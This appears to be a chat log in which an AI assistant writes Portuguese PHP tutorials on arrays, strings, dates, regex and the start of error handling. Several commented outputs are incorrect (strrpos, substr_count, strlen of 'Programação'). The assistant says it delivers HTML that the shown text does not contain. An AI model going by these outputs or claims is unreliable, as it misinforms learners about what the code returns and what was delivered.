Arrays associativos usam strings como chaves em vez de índices numéricos. São equivalentes a dicionários ou mapas em outras linguagens:

```php
<?php
declare(strict_types=1);

// Criando com chaves string
$usuario = [
    "nome"    => "Ana Silva",
    "email"   => "ana@email.com",
    "idade"   => 28,
    "ativo"   => true,
];

// Acessando por chave
echo $usuario["nome"];   // Ana Silva
echo $usuario["idade"];  // 28

// Modificando um valor existente
$usuario["idade"] = 29;

// Adicionando uma nova chave
$usuario["perfil"] = "administrador";

// Removendo uma chave
unset($usuario["ativo"]);

// Verificando se uma chave existe
var_dump(isset($usuario["email"]));          // bool(true)
var_dump(isset($usuario["ativo"]));          // bool(false) — removido
var_dump(array_key_exists("email", $usuario)); // bool(true) — mais preciso que isset

// Listando chaves e valores separadamente
$chaves  = array_keys($usuario);   // ["nome", "email", "idade", "perfil"]
$valores = array_values($usuario); // ["Ana Silva", "ana@email.com", 29, "administrador"]
```

A diferença entre `isset()` e `array_key_exists()` é sutil mas importante: `isset()` retorna `false` se a chave existir mas seu valor for `null`. `array_key_exists()` retorna `true` independentemente do valor — verifique apenas se a chave existe.

---

## Arrays multidimensionais

Arrays podem conter outros arrays como valores, criando estruturas multidimensionais. Esse é o padrão usado para representar dados relacionais — exatamente o que vem de um banco de dados:

```php
<?php
declare(strict_types=1);

// Array de arrays associativos — estrutura típica de resultado de banco
$usuarios = [
    [
        "id"    => 1,
        "nome"  => "Ana",
        "email" => "ana@email.com",
        "cargo" => ["titulo" => "Desenvolvedora", "nivel" => "Senior"],
    ],
    [
        "id"    => 2,
        "nome"  => "Bruno",
        "email" => "bruno@email.com",
        "cargo" => ["titulo" => "Designer", "nivel" => "Pleno"],
    ],
];

// Acessando dados aninhados com múltiplos colchetes
echo $usuarios[0]["nome"];              // Ana
echo $usuarios[0]["cargo"]["titulo"];   // Desenvolvedora
echo $usuarios[1]["cargo"]["nivel"];    // Pleno

// Iterando estrutura multidimensional
foreach ($usuarios as $usuario) {
    // $usuario é um array associativo
    echo "{$usuario['nome']} — {$usuario['cargo']['titulo']}\n";
}
// Ana — Desenvolvedora
// Bruno — Designer

// array_column — extrai uma coluna de um array multidimensional
// Equivale a: SELECT nome FROM usuarios
$nomes = array_column($usuarios, "nome");
print_r($nomes); // ["Ana", "Bruno"]

// Também pode usar uma coluna como índice do resultado
$porId = array_column($usuarios, null, "id");
// Agora $porId[1] é o array do usuário com id=1
echo $porId[1]["nome"]; // Ana
```

---

## Adicionando e removendo elementos

```php
<?php
declare(strict_types=1);

$pilha = ["a", "b", "c"];

// Adicionando ao final
$pilha[] = "d";          // forma mais comum
array_push($pilha, "e"); // equivalente, mas [] é preferido

// Removendo do final — retorna o elemento removido
$ultimo = array_pop($pilha); // "e"

// Adicionando ao início
array_unshift($pilha, "z"); // $pilha = ["z", "a", "b", "c", "d"]

// Removendo do início — retorna o elemento removido
$primeiro = array_shift($pilha); // "z"

// Removendo por índice específico
// unset remove o elemento mas não reindexia
unset($pilha[1]); // remove "b", índices ficam: 0=>"a", 2=>"c", 3=>"d"

// array_splice — remove e opcionalmente insere, reindexia automaticamente
// array_splice($array, $inicio, $quantidade, $substituicao)
$cores = ["vermelho", "verde", "azul", "amarelo"];
$removidas = array_splice($cores, 1, 2); // remove 2 a partir do índice 1
// $cores = ["vermelho", "amarelo"]
// $removidas = ["verde", "azul"]

// Inserindo no meio com array_splice
array_splice($cores, 1, 0, ["roxo", "laranja"]); // insere sem remover
// $cores = ["vermelho", "roxo", "laranja", "amarelo"]
```

---

## Funções essenciais de array

O PHP tem mais de 70 funções nativas para arrays. Aqui estão as mais importantes:

### Busca e verificação

```php
<?php
declare(strict_types=1);

$numeros = [10, 20, 30, 40, 50];
$frutas  = ["maçã", "banana", "laranja"];

// in_array — verifica se um valor existe
var_dump(in_array(30, $numeros));         // bool(true)
var_dump(in_array("banana", $frutas));    // bool(true)
var_dump(in_array("uva", $frutas));       // bool(false)

// Terceiro argumento true = comparação estrita (===)
var_dump(in_array("30", $numeros));        // bool(true) — coerção!
var_dump(in_array("30", $numeros, true));  // bool(false) — estrito

// array_search — retorna a chave do elemento encontrado, ou false
$posicao = array_search(30, $numeros);
var_dump($posicao); // int(2)

$ausente = array_search(99, $numeros);
var_dump($ausente); // bool(false)

// Cuidado: posição 0 e false são ambos falsy!
// Use === false para verificar ausência
if (array_search(10, $numeros) !== false) {
    echo "Encontrado!\n";
}
```

### Ordenação

```php
<?php
declare(strict_types=1);

$numeros = [3, 1, 4, 1, 5, 9, 2, 6];
$nomes   = ["Carlos", "Ana", "Beatriz", "David"];

// sort — ordena por valor, reindexia (destrói chaves originais)
sort($numeros);    // [1, 1, 2, 3, 4, 5, 6, 9]
sort($nomes);      // ["Ana", "Beatriz", "Carlos", "David"]

// rsort — ordem decrescente
rsort($numeros);   // [9, 6, 5, 4, 3, 2, 1, 1]

// asort — ordena por valor, PRESERVA as chaves
$notas = ["Ana" => 9.5, "Bruno" => 7.0, "Carla" => 8.5];
asort($notas);
// ["Bruno" => 7.0, "Carla" => 8.5, "Ana" => 9.5]

// arsort — ordem decrescente, preserva chaves
arsort($notas);
// ["Ana" => 9.5, "Carla" => 8.5, "Bruno" => 7.0]

// ksort — ordena por chave
$config = ["z_timeout" => 30, "a_host" => "localhost", "m_port" => 3306];
ksort($config);
// ["a_host" => ..., "m_port" => ..., "z_timeout" => ...]

// usort — ordenação customizada com função de comparação
$usuarios = [
    ["nome" => "Carlos", "idade" => 35],
    ["nome" => "Ana",    "idade" => 28],
    ["nome" => "Bruno",  "idade" => 42],
];

// Ordena por idade usando spaceship operator
usort($usuarios, fn(array $a, array $b): int => $a["idade"] <=> $b["idade"]);
// Ana(28), Carlos(35), Bruno(42)
```

### Transformação

```php
<?php
declare(strict_types=1);

$numeros = [1, 2, 3, 4, 5];
$precos  = [10.0, 25.5, 8.0, 42.0, 15.0];

// array_map — aplica função a cada elemento, retorna novo array
$dobrados = array_map(fn(int $n): int => $n * 2, $numeros);
// [2, 4, 6, 8, 10]

// array_map com múltiplos arrays
$a = [1, 2, 3];
$b = [10, 20, 30];
$soma = array_map(fn(int $x, int $y): int => $x + $y, $a, $b);
// [11, 22, 33]

// array_filter — mantém apenas os elementos que passam no teste
$pares = array_filter($numeros, fn(int $n): bool => $n % 2 === 0);
// [2, 4] — note: chaves originais são preservadas (1 e 3)

// array_values reindexia após filter
$pares = array_values(array_filter($numeros, fn(int $n): bool => $n % 2 === 0));
// [2, 4] com índices 0 e 1

// array_reduce — reduz o array a um único valor
$total = array_reduce($precos, fn(float $carry, float $item): float => $carry + $item, 0.0);
echo $total; // 100.5

// Calculando média com array_reduce
$media = array_reduce($precos, fn(float $carry, float $item): float => $carry + $item, 0.0) / count($precos);
echo $media; // 20.1

// array_unique — remove valores duplicados
$comDuplicatas = [1, 2, 2, 3, 3, 3, 4];
$unicos = array_unique($comDuplicatas);
// [1, 2, 3, 4]
```

### Fatiamento e combinação

```php
<?php
declare(strict_types=1);

$letras = ["a", "b", "c", "d", "e", "f"];

// array_slice — extrai uma porção do array
$parte = array_slice($letras, 1, 3);       // ["b", "c", "d"]
$final = array_slice($letras, -2);          // ["e", "f"] — índice negativo
$reindexa = array_slice($letras, 2, 3, true); // preserva chaves originais

// array_merge — une dois ou mais arrays
$a = ["maçã", "banana"];
$b = ["laranja", "uva"];
$c = array_merge($a, $b); // ["maçã", "banana", "laranja", "uva"]

// Com arrays associativos — chaves repetidas: o segundo sobrescreve
$padroes = ["tema" => "claro", "idioma" => "pt-BR", "itens" => 10];
$config   = ["tema" => "escuro", "debug" => true];
$final    = array_merge($padroes, $config);
// ["tema" => "escuro", "idioma" => "pt-BR", "itens" => 10, "debug" => true]

// Operador + — alternativo ao merge: a chave do primeiro vence
$final2 = $padroes + $config;
// ["tema" => "claro", "idioma" => "pt-BR", "itens" => 10, "debug" => true]

// array_combine — cria associativo a partir de dois arrays (chaves + valores)
$chaves  = ["nome", "email", "cidade"];
$valores = ["Ana", "ana@email.com", "São Paulo"];
$pessoa  = array_combine($chaves, $valores);
// ["nome" => "Ana", "email" => "ana@email.com", "cidade" => "São Paulo"]

// array_chunk — divide em pedaços
$numeros = [1, 2, 3, 4, 5, 6, 7];
$grupos  = array_chunk($numeros, 3);
// [[1,2,3], [4,5,6], [7]]
```

---

## Funções de contagem e matemática

```php
<?php
declare(strict_types=1);

$valores = [5, 3, 8, 1, 9, 2, 7, 4, 6];
$precos  = [10.5, 25.0, 8.75, 42.0];

echo count($valores);       // 9 — número de elementos
echo array_sum($precos);    // 86.25 — soma de todos os elementos
echo array_product([1,2,3,4]); // 24 — produto de todos os elementos
echo min($valores);          // 1 — menor valor
echo max($valores);          // 9 — maior valor

// Funções que funcionam com arrays
$arredondados = array_map(fn(float $p): float => round($p, 1), $precos);

// compact e extract — atalhos para criar arrays de variáveis
$nome   = "Ana";
$idade  = 28;
$cidade = "São Paulo";

// compact cria array associativo a partir de variáveis
$dados = compact("nome", "idade", "cidade");
// ["nome" => "Ana", "idade" => 28, "cidade" => "São Paulo"]

// extract faz o inverso — cria variáveis a partir de array
// Use com cuidado: pode sobrescrever variáveis existentes
extract($dados); // cria $nome, $idade, $cidade no escopo atual
```

---

## Padrões práticos com arrays

```php
<?php
declare(strict_types=1);

// Agrupando dados por critério
$transacoes = [
    ["tipo" => "entrada", "valor" => 500.0],
    ["tipo" => "saida",   "valor" => 120.0],
    ["tipo" => "entrada", "valor" => 300.0],
    ["tipo" => "saida",   "valor" => 80.0],
];

$grupos = [];
foreach ($transacoes as $t) {
    // Agrupa pelo campo "tipo"
    $grupos[$t["tipo"]][] = $t["valor"];
}

// $grupos = [
//   "entrada" => [500.0, 300.0],
//   "saida"   => [120.0, 80.0]
// ]

$totalEntradas = array_sum($grupos["entrada"]); // 800.0
$totalSaidas   = array_sum($grupos["saida"]);   // 200.0

// Pipeline funcional — filtrar, transformar, reduzir
$produtos = [
    ["nome" => "Teclado",  "preco" => 250.0, "ativo" => true],
    ["nome" => "Mouse",    "preco" => 80.0,  "ativo" => false],
    ["nome" => "Monitor",  "preco" => 1200.0,"ativo" => true],
    ["nome" => "Headset",  "preco" => 350.0, "ativo" => true],
];

// Soma o preço dos produtos ativos com preço abaixo de R$500
$totalAtivosBaratos = array_reduce(
    array_filter(
        $produtos,
        fn(array $p): bool => $p["ativo"] && $p["preco"] < 500.0
    ),
    fn(float $carry, array $p): float => $carry + $p["preco"],
    0.0
);

echo $totalAtivosBaratos; // 600.0 (Teclado 250 + Headset 350)
```

---

## Resumo

| Função | O que faz |
|---|---|
| `count()` | Número de elementos |
| `in_array($val, $arr, true)` | Verifica se valor existe (use `true` para strict) |
| `array_search()` | Retorna a chave do valor encontrado |
| `array_key_exists()` | Verifica se chave existe (mesmo se valor for null) |
| `array_keys()` / `array_values()` | Extrai chaves ou valores |
| `array_column()` | Extrai coluna de array multidimensional |
| `sort()` / `rsort()` | Ordena por valor (reindexia) |
| `asort()` / `arsort()` | Ordena por valor (preserva chaves) |
| `usort()` | Ordenação customizada com callback |
| `array_map()` | Transforma cada elemento |
| `array_filter()` | Filtra elementos por condição |
| `array_reduce()` | Reduz a um único valor |
| `array_merge()` | Une arrays |
| `array_slice()` | Extrai porção do array |
| `array_chunk()` | Divide em grupos de N elementos |
| `array_unique()` | Remove duplicatas |
| `array_push()` / `array_pop()` | Adiciona/remove do final |
| `array_unshift()` / `array_shift()` | Adiciona/remove do início |

---

## Referências e leituras para aprofundar

- **Funções de array — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/ref.array.php
  Referência completa das mais de 70 funções nativas para arrays do PHP, com exemplos para cada uma.

- **array_map — php.net**
  https://www.php.net/manual/pt_BR/function.array-map.php
  Documentação detalhada do `array_map`, incluindo o comportamento com múltiplos arrays e com null como callback.

- **array_reduce — php.net**
  https://www.php.net/manual/pt_BR/function.array-reduce.php
  Documentação do `array_reduce` com exemplos de acumuladores e a importância do valor inicial correto.

- **PHP: The Right Way — Arrays**
  https://phptherightway.com/#arrays
  Seção sobre boas práticas de arrays, quando usar funções funcionais e quando usar loops explícitos.

- **SPL Data Structures — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/spl.datastructures.php
  Estruturas de dados especializadas da SPL: SplStack, SplQueue, SplHeap. Para quando arrays simples não são suficientes.

- **WENGROW, Jay.** *A Common-Sense Guide to Data Structures and Algorithms*. 2ª ed. Pragmatic Bookshelf, 2020.
  https://pragprog.com/titles/jwdsal2/a-common-sense-guide-to-data-structures-and-algorithms-second-edition/
  Introdução acessível a estruturas de dados e algoritmos, com foco em quando usar cada estrutura. Leitura recomendada após dominar os arrays do PHP.

---

**No próximo artigo:** Strings em profundidade — funções avançadas, expressões regulares e manipulação segura de texto.

---

Gerando o HTML agora.

Artigo 08 entregue — texto acima e HTML aqui.

**Destaques deste artigo:**
- **Cards agrupados por categoria** de funções (busca, ordenação, transformação) — referência visual rápida
- **Diagrama de pipeline** mostrando visualmente o fluxo filter → reduce com cores distintas por operação
- Cobertura completa de `array_column()` com indexação por campo — padrão muito usado com dados de banco
- Diferença detalhada entre `isset()` e `array_key_exists()` com exemplo da armadilha do valor `null`
- Desafio final de implementar um `GROUP BY` em PHP puro

Com o Artigo 08, o **Módulo 1 está completo** — 8 artigos cobrindo toda a base do PHP. Diga **"Continue"** para iniciar o Módulo 2 com o Artigo 09 — *Strings em Profundidade*.

---

# you asked

message time: 2026-03-06 04:31:35

Continue

---

# claude response

# Artigo 09 — Strings em Profundidade

**Módulo 2 · Semana 9 · Nível: Intermediário**

---

## Introdução

Strings são o tipo de dado mais presente em qualquer aplicação web. Toda entrada de usuário chega como string. Todo HTML gerado é uma string. Todo JSON enviado e recebido passa por strings. Manipular texto com precisão, segurança e eficiência é uma habilidade central do desenvolvimento PHP.

Neste artigo vamos além do básico — cobrimos as funções mais importantes da biblioteca de strings do PHP, formatação de números e datas, e uma introdução prática às expressões regulares com `preg_match` e `preg_replace`.

---

## Revisão rápida: aspas simples vs duplas

Antes de avançar, vale consolidar um ponto do Artigo 04:

```php
<?php
declare(strict_types=1);

$nome = "Ricardo";

// Aspas simples — literal, sem interpolação, mais rápido
echo 'Olá, $nome';       // Olá, $nome (literal)
echo 'Ela disse: "oi"';  // sem necessidade de escapar aspas duplas

// Aspas duplas — interpola variáveis e sequências de escape
echo "Olá, $nome";          // Olá, Ricardo
echo "Olá, {$nome}!";       // Olá, Ricardo! — chaves delimitam a variável
echo "Linha 1\nLinha 2";    // \n = quebra de linha
echo "Coluna1\tColuna2";    // \t = tabulação

// Heredoc — para strings longas com interpolação
$html = <<<HTML
    <div class="perfil">
        <h1>$nome</h1>
    </div>
    HTML;

// Nowdoc — como heredoc mas sem interpolação (equivalente às aspas simples)
$sql = <<<'SQL'
    SELECT * FROM usuarios WHERE nome = '$nome'
    SQL;
// $nome não é interpolado — útil para SQL, templates, etc.
```

A regra prática: use aspas simples quando não precisar de interpolação. O código fica mais rápido e deixa claro que a string é literal.

---

## Funções fundamentais de string

```php
<?php
declare(strict_types=1);

$texto = "  Dominando o PHP em 1 Ano  ";
$frase = "O rato roeu a roupa do rei de Roma";

// Tamanho e limpeza
echo strlen($texto);          // 28 — inclui os espaços
echo mb_strlen($texto);       // 28 — versão multibyte (use para Unicode)
echo trim($texto);            // "Dominando o PHP em 1 Ano"
echo ltrim($texto);           // remove espaços só da esquerda
echo rtrim($texto);           // remove espaços só da direita
echo trim($texto, " D");      // remove " " e "D" das bordas

// Capitalização
echo strtolower($frase);      // tudo minúsculo
echo strtoupper($frase);      // TUDO MAIÚSCULO
echo ucfirst("olá mundo");    // Olá mundo — primeira letra maiúscula
echo ucwords("olá mundo php");// Olá Mundo Php — primeira de cada palavra
echo mb_strtolower("AÇÃO");   // ação — versão multibyte para acentos

// Busca e posição
echo strpos($frase, "rato");     // 3 — posição da primeira ocorrência
echo strrpos($frase, "ro");      // 27 — posição da última ocorrência
echo substr_count($frase, "ro"); // 4 — quantas vezes "ro" aparece

// Atenção: strpos pode retornar 0 (início da string) — use !== false
$pos = strpos($frase, "O");
if ($pos !== false) {
    echo "Encontrado na posição $pos\n"; // 0
}

// substr — extrai parte da string
echo substr($frase, 3, 4);    // "rato" — começa na pos 3, pega 4 chars
echo substr($frase, -4);      // "Roma" — 4 caracteres do final
echo mb_substr($frase, 3, 4); // versão multibyte

// Substituição
echo str_replace("rato", "gato", $frase);
// "O gato roeu a roupa do rei de Roma"

// Substituição case-insensitive
echo str_ireplace("RAtO", "gato", $frase);
// "O gato roeu a roupa do rei de Roma"

// Múltiplas substituições de uma vez
echo str_replace(
    ["rato", "roupa", "rei"],    // buscar
    ["gato", "calça", "dono"],   // substituir por
    $frase
);
```

---

## Divisão e junção

```php
<?php
declare(strict_types=1);

$csv      = "Ana,Bruno,Carla,David";
$frase    = "PHP é incrível";
$nomes    = ["Ana", "Bruno", "Carla"];

// explode — divide string em array pelo separador
$partes = explode(",", $csv);
// ["Ana", "Bruno", "Carla", "David"]

// Terceiro argumento limita o número de partes
$limitado = explode(",", $csv, 2);
// ["Ana", "Bruno,Carla,David"] — divide no máximo em 2 partes

// implode — une array em string com separador
echo implode(", ", $nomes);     // "Ana, Bruno, Carla"
echo implode(" | ", $nomes);    // "Ana | Bruno | Carla"
echo implode("", $nomes);       // "AnaBrunoCarla"

// str_split — divide em pedaços de N caracteres
$chars = str_split("PHP", 1);   // ["P", "H", "P"]
$pares = str_split("ABCDEF", 2); // ["AB", "CD", "EF"]

// wordwrap — quebra string em linhas com largura máxima
$texto = "Este é um texto longo que precisa ser quebrado em múltiplas linhas para exibição.";
echo wordwrap($texto, 40, "\n", true);
```

---

## Formatação

```php
<?php
declare(strict_types=1);

// number_format — formata números para exibição
$preco    = 1234567.891;

echo number_format($preco);              // 1,234,568 — padrão americano
echo number_format($preco, 2);           // 1,234,567.89
echo number_format($preco, 2, ',', '.'); // 1.234.567,89 — padrão brasileiro

// sprintf — formata string com placeholders
$nome  = "Ana";
$nota  = 9.75;
$media = 8.423;

echo sprintf("Aluna: %s | Nota: %.2f", $nome, $nota);
// "Aluna: Ana | Nota: 9.75"

echo sprintf("Média: %.1f", $media);  // "Média: 8.4"
echo sprintf("Código: %05d", 42);     // "Código: 00042" — zero-padded
echo sprintf("Hex: %x", 255);         // "Hex: ff"
echo sprintf("Porcentagem: %.1f%%", 94.567); // "Porcentagem: 94.6%"

// printf — como sprintf mas já imprime
printf("%-15s %5.2f\n", "Produto A", 129.9);  // alinhamento
printf("%-15s %5.2f\n", "Produto B", 49.5);

// number_format vs sprintf para moeda
$valor = 1500.5;
$formatadoNF  = "R$ " . number_format($valor, 2, ',', '.');   // R$ 1.500,50
$formatadoSPF = sprintf("R$ %.2f", $valor);                    // R$ 1500.50
```

---

## Datas e horas

```php
<?php
declare(strict_types=1);

// date() — formata a data/hora atual
echo date("d/m/Y");       // 08/03/2026
echo date("H:i:s");       // 14:35:20
echo date("d/m/Y H:i");   // 08/03/2026 14:35
echo date("l, d F Y");    // Saturday, 08 March 2026
echo date("U");           // Unix timestamp atual

// Caracteres de formato mais usados
// d = dia com zero | j = dia sem zero
// m = mês com zero | n = mês sem zero
// Y = ano 4 dígitos | y = ano 2 dígitos
// H = hora 24h | h = hora 12h
// i = minutos | s = segundos
// D = dia abreviado | l = dia completo
// M = mês abreviado | F = mês completo
// N = dia da semana (1=seg, 7=dom)
// U = Unix timestamp

// mktime() — cria um timestamp a partir de componentes
$natal = mktime(0, 0, 0, 12, 25, 2026); // hora, min, seg, mês, dia, ano
echo date("d/m/Y", $natal); // 25/12/2026

// strtotime() — converte string para timestamp
$amanha    = strtotime("+1 day");
$semanaPassada = strtotime("-1 week");
$proximaMes = strtotime("+1 month");
$dataEspecifica = strtotime("2026-06-15");

echo date("d/m/Y", $amanha);         // data de amanhã
echo date("d/m/Y", $semanaPassada);  // data de uma semana atrás
echo date("d/m/Y", $dataEspecifica); // 15/06/2026

// DateTime — classe orientada a objetos (mais recomendada para projetos modernos)
$hoje   = new DateTime();
$futuro = new DateTime("+30 days");
$fixa   = new DateTime("2026-12-31");

echo $hoje->format("d/m/Y H:i");     // data e hora atual formatada
echo $fixa->format("l, d F Y");      // "Thursday, 31 December 2026"

// Diferença entre datas
$inicio = new DateTime("2026-01-01");
$fim    = new DateTime("2026-12-31");
$diff   = $inicio->diff($fim);

echo $diff->days;    // 364
echo $diff->months;  // 11

// DateTimeImmutable — versão que não modifica o objeto original
// Preferida em código funcional e quando você precisa preservar a data original
$base      = new DateTimeImmutable("2026-03-01");
$mais30    = $base->modify("+30 days"); // retorna NOVO objeto
$mais60    = $base->modify("+60 days"); // $base ainda é 01/03

echo $base->format("d/m/Y");    // 01/03/2026 — não modificado
echo $mais30->format("d/m/Y");  // 31/03/2026
echo $mais60->format("d/m/Y");  // 30/04/2026
```

---

## Expressões regulares

Expressões regulares (regex) são padrões de busca que permitem encontrar, validar e extrair texto com uma precisão impossível de alcançar com funções simples de string. O PHP usa funções `preg_*` que implementam o padrão PCRE (Perl Compatible Regular Expressions):

```php
<?php
declare(strict_types=1);

// preg_match — verifica se o padrão existe e captura grupos
// Retorna 1 se encontrou, 0 se não encontrou, false em erro
$email = "ana@email.com";

// Delimitadores: / no início e fim. Flags após o delimitador final.
$padrao = '/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/';

if (preg_match($padrao, $email)) {
    echo "E-mail válido\n";
}

// Capturando grupos com parênteses
$data = "Hoje é 08/03/2026";
preg_match('/(\d{2})\/(\d{2})\/(\d{4})/', $data, $matches);

// $matches[0] = string completa correspondida
// $matches[1] = primeiro grupo capturado
// $matches[2] = segundo grupo
// $matches[3] = terceiro grupo
echo $matches[0]; // "08/03/2026"
echo $matches[1]; // "08"
echo $matches[2]; // "03"
echo $matches[3]; // "2026"

// Grupos nomeados — mais legível que índices numéricos
preg_match('/(?P<dia>\d{2})\/(?P<mes>\d{2})\/(?P<ano>\d{4})/', $data, $m);
echo $m["dia"]; // "08"
echo $m["mes"]; // "03"
echo $m["ano"]; // "2026"
```

```php
<?php
declare(strict_types=1);

// preg_match_all — encontra TODAS as ocorrências
$html    = '<a href="https://php.net">PHP</a> e <a href="https://laravel.com">Laravel</a>';
$padrao  = '/<a href="([^"]+)">([^<]+)<\/a>/';

preg_match_all($padrao, $html, $matches);

// $matches[0] = array com as strings completas
// $matches[1] = array com o grupo 1 (URLs)
// $matches[2] = array com o grupo 2 (textos dos links)
print_r($matches[1]); // ["https://php.net", "https://laravel.com"]
print_r($matches[2]); // ["PHP", "Laravel"]

// preg_replace — substitui com regex
$telefone = "(11) 9 8765-4321";

// Remove tudo que não for dígito
$somenteDigitos = preg_replace('/\D/', '', $telefone);
echo $somenteDigitos; // "11987654321"

// preg_replace com referência de grupo ($1, $2...)
$data = "2026-03-08";
$dataFormatada = preg_replace('/(\d{4})-(\d{2})-(\d{2})/', '$3/$2/$1', $data);
echo $dataFormatada; // "08/03/2026"

// preg_split — divide string usando regex como separador
$texto  = "um  dois   três    quatro"; // múltiplos espaços
$partes = preg_split('/\s+/', $texto); // divide por um ou mais espaços
print_r($partes); // ["um", "dois", "três", "quatro"]
```

---

## Referência rápida de metacaracteres regex

```php
<?php
declare(strict_types=1);

// METACARACTERES ESSENCIAIS
// .   = qualquer caractere (exceto \n)
// \d  = dígito [0-9]
// \D  = não-dígito
// \w  = palavra [a-zA-Z0-9_]
// \W  = não-palavra
// \s  = espaço em branco (espaço, tab, newline)
// \S  = não-espaço

// QUANTIFICADORES
// *   = zero ou mais
// +   = um ou mais
// ?   = zero ou um (opcional)
// {n} = exatamente n vezes
// {n,} = n ou mais vezes
// {n,m} = entre n e m vezes

// ÂNCORAS
// ^   = início da string
// $   = fim da string
// \b  = limite de palavra

// CLASSES DE CARACTERE
// [abc]  = a, b ou c
// [^abc] = qualquer coisa exceto a, b ou c
// [a-z]  = qualquer letra minúscula

// FLAGS (após o delimitador)
// i = case-insensitive
// m = multiline (^ e $ por linha)
// s = . inclui \n
// u = modo Unicode

// Exemplos práticos de validação
$padroes = [
    "cep"      => '/^\d{5}-?\d{3}$/',
    "cpf"      => '/^\d{3}\.\d{3}\.\d{3}-\d{2}$/',
    "telefone" => '/^\(?\d{2}\)?\s?9?\d{4}-?\d{4}$/',
    "url"      => '/^https?:\/\/[\w\-]+(\.[\w\-]+)+/',
    "cor_hex"  => '/^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$/',
];

$testes = [
    "cep"      => "01310-100",
    "cpf"      => "123.456.789-09",
    "telefone" => "(11) 98765-4321",
    "url"      => "https://php.net",
    "cor_hex"  => "#FF5733",
];

foreach ($padroes as $tipo => $padrao) {
    $valido = preg_match($padrao, $testes[$tipo]) ? "válido" : "inválido";
    echo "$tipo: $valido\n";
}
```

---

## Segurança com strings

```php
<?php
declare(strict_types=1);

// htmlspecialchars — escapa caracteres HTML
// SEMPRE use ao exibir dados do usuário em HTML
$entrada = '<script>alert("XSS")</script>';
echo htmlspecialchars($entrada, ENT_QUOTES, 'UTF-8');
// &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;

// htmlspecialchars_decode — inverte a operação
// strip_tags — remove todas as tags HTML
$html   = '<p>Texto <strong>importante</strong></p>';
$limpo  = strip_tags($html);         // "Texto importante"
$comP   = strip_tags($html, '<p>');  // "<p>Texto importante</p>" — permite <p>

// Verificando e convertindo encoding
$utf8 = mb_convert_encoding("Ação", "UTF-8", "ISO-8859-1");

// mb_strlen e mb_substr para strings com acentos
$palavra = "Programação";
echo strlen($palavra);     // pode dar 12 em UTF-8 (bytes, não chars)
echo mb_strlen($palavra);  // 11 — caracteres reais
echo mb_substr($palavra, 0, 7); // "Program"
```

---

## Boas práticas com strings

**Use sempre `mb_*` para strings com caracteres não-ASCII.** Em qualquer aplicação brasileira, `mb_strlen`, `mb_strtolower`, `mb_substr` são obrigatórios. As funções sem `mb_` operam em bytes, não em caracteres.

**Escape sempre entradas de usuário com `htmlspecialchars`.** Nunca exiba dados de formulário ou banco de dados diretamente no HTML — isso abre vetores de ataque XSS.

**Prefira `sprintf` a concatenações longas.** `sprintf("Olá, %s! Você tem %d mensagens.", $nome, $total)` é muito mais legível do que `"Olá, " . $nome . "! Você tem " . $total . " mensagens."`.

**Use `DateTimeImmutable` em código novo.** Objetos imutáveis são mais seguros do que `DateTime` mutável — você não corre o risco de modificar acidentalmente uma data compartilhada.

**Teste regex em ferramentas online antes de colocar no código.** Sites como regex101.com permitem testar padrões com visualização em tempo real, o que economiza muito tempo de debugging.

---

## Resumo

| Função / Recurso | O que faz |
|---|---|
| `mb_strlen()` / `mb_substr()` | Tamanho e extração com suporte Unicode |
| `trim()` / `ltrim()` / `rtrim()` | Remove espaços (ou chars) das bordas |
| `str_replace()` | Substituição simples de string |
| `explode()` / `implode()` | Divide string em array / une array em string |
| `sprintf()` | Formata string com placeholders tipados |
| `number_format()` | Formata número para exibição |
| `date()` / `DateTime` | Formata datas — prefira `DateTime` em código novo |
| `DateTimeImmutable` | Datas imutáveis — prefira em código funcional |
| `strtotime()` | Converte string para timestamp |
| `preg_match()` | Verifica padrão e captura grupos |
| `preg_match_all()` | Encontra todas as ocorrências |
| `preg_replace()` | Substitui com regex |
| `htmlspecialchars()` | Escapa HTML — obrigatório ao exibir entradas |

---

## Referências e leituras para aprofundar

- **Funções de string — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/ref.strings.php
  Referência completa das funções de string nativas do PHP.

- **Extensão mbstring — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/book.mbstring.php
  Documentação da extensão multibyte para strings com Unicode. Essencial para aplicações em português.

- **Funções de data e hora — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/ref.datetime.php
  Referência das funções de data, incluindo `date()`, `strtotime()`, `mktime()` e toda a classe `DateTime`.

- **DateTimeImmutable — Manual oficial do PHP**
  https://www.php.net/manual/pt_BR/class.datetimeimmutable.php
  Documentação da classe `DateTimeImmutable` com todos os métodos disponíveis.

- **PCRE — Expressões regulares no PHP**
  https://www.php.net/manual/pt_BR/book.pcre.php
  Referência completa das funções `preg_*` e da sintaxe de expressões regulares PCRE suportada pelo PHP.

- **regex101 — Testador de expressões regulares online**
  https://regex101.com
  Ferramenta indispensável para construir e depurar expressões regulares. Selecione o sabor "PHP (PCRE2)" para resultados compatíveis.

---

**No próximo artigo:** Trabalhando com datas, horas e timezones — DateTime, DateInterval, DatePeriod e boas práticas para aplicações internacionais.

---

Gerando o HTML.

---

# claude response

# Artigo 10 — Tratamento de Erros e Exceções

**Módulo 2 · Semana 10 · Nível: Intermediário**

---

## Introdução

Todo programa encontra situações inesperadas: um arquivo que não existe, uma conexão de banco que falha, um valor inválido recebido do usuário. A questão não é se esses problemas vão acontecer — é quando. A diferença entre um software robusto e um frágil é precisamente como ele lida com essas situações.

O PHP oferece dois mecanismos principais para isso: o sistema tradicional de erros — com níveis como `E_WARNING` e `E_NOTICE` — e o sistema moderno de exceções com `try`, `catch` e `finally`. Entender ambos, e saber quando usar cada um, é essencial para qualquer desenvolvedor PHP sério.

---

## O sistema de erros do PHP

Antes das exceções, o PHP lidava com problemas através de um sistema de níveis de erro. Esses ainda existem e aparecem com frequência:

```php
<?php
declare(strict_types=1);

// Níveis de erro mais comuns:
// E_ERROR   — erro fatal, encerra o script
// E_WARNING — aviso, script continua
// E_NOTICE  — informativo, script continua
// E_DEPRECATED — uso de recurso obsoleto

// Configurando exibição de erros (apenas em desenvolvimento!)
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL); // reporta todos os níveis

// Em produção, NUNCA exiba erros — apenas registre no log
// ini_set('display_errors', '0');
// ini_set('log_errors', '1');
